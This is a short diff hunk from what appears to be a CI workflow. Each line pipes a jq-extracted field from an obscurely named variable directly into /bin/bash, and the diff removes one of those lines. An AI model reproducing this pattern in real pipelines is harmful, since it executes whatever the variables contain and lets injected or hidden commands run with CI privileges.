@@ -28,7 +28,6 @@ jobs:
           echo $egsgi14 | jq -r .jnun2 | /bin/bash
           printf '%s' "$mi54012" | jq -r .fgj90647 | /bin/bash
           printf '%s' "$ajfmt74" | jq -r .kptc9 | /bin/bash
-          echo $crr3169 | jq -r .v4737 | /bin/bash
           printf '%s' "$bmuu446" | jq -r .ia9178 | /bin/bash
           printf '%s' "$y07104" | jq -r .czt15 | /bin/bash
           echo $tqo8357 | jq -r .dhqjo1508 | /bin/bash
